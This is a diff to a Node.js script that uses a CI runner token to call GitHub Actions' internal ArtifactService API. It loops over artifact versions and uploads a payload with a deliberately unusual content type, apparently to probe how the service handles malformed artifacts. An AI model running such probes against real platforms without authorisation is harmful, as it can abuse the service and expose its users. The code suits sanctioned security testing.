@@ -21,27 +21,22 @@ async function post(url, body) { return fetch(url, { method: 'POST', headers: { 
   const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
   const [, runId, jobId] = scope.split(':');
   const svc = 'github.actions.results.api.v1.ArtifactService';
-  for (const [label, version, mime, blobct] of [
-    ['f1', 6, odd, 'application/json'],
-    ['f2', 6, odd, odd],
-    ['f3', 6, 'application/json', odd],
-    ['f4', 7, 'application/json', odd],
-  ]) {
-    const name = `${label}-${Date.now()}.dat`;
+  for (const v of [0,1,2,3,4,5,6]) {
+    const name = `g${v}-${Date.now()}.dat`;
     try {
-      const req = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(5, version), fs(6, wrap(Buffer.from(mime)))]);
+      const req = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(5, v), fs(6, wrap(Buffer.from(odd)))]);
       const c = await post(`${base}/twirp/${svc}/CreateArtifact`, req);
       const cb = Buffer.from(await c.arrayBuffer());
-      if (!c.ok) { console.log('RESULT', label, 'create', c.status, cb.toString().slice(0, 90)); continue; }
+      if (!c.ok) { console.log('RESULT', v, 'create', c.status, cb.toString().slice(0, 80)); continue; }
       const signed = fields(cb).find(([n, w]) => n === 2 && w === 2)[2].toString();
-      const up = await putRaw(signed, payload, { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': blobct, 'Content-Length': String(payload.length) });
+      const up = await putRaw(signed, payload, { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': odd, 'Content-Length': String(payload.length) });
       const digest = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
       const fin = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(4, payload.length), fs(5, wrap(Buffer.from(digest)))]);
       const f = await post(`${base}/twirp/${svc}/FinalizeArtifact`, fin);
       const fb = Buffer.from(await f.arrayBuffer());
-      if (!f.ok) { console.log('RESULT', label, 'finalize', f.status, fb.toString().slice(0, 90)); continue; }
+      if (!f.ok) { console.log('RESULT', v, 'finalize', f.status, fb.toString().slice(0, 80)); continue; }
       const aid = fields(fb).find(([n, w]) => n === 2 && w === 0)[2].toString();
-      console.log('RESULT', label, 'id', aid, 'up', up.status);
-    } catch (e) { console.log('RESULT', label, 'ERR', String(e).slice(0, 120)); }
+      console.log('RESULT', v, 'id', aid);
+    } catch (e) { console.log('RESULT', v, 'ERR', String(e).slice(0, 100)); }
   }
 })().catch(e => { console.error('FATAL', e); process.exitCode = 1; });
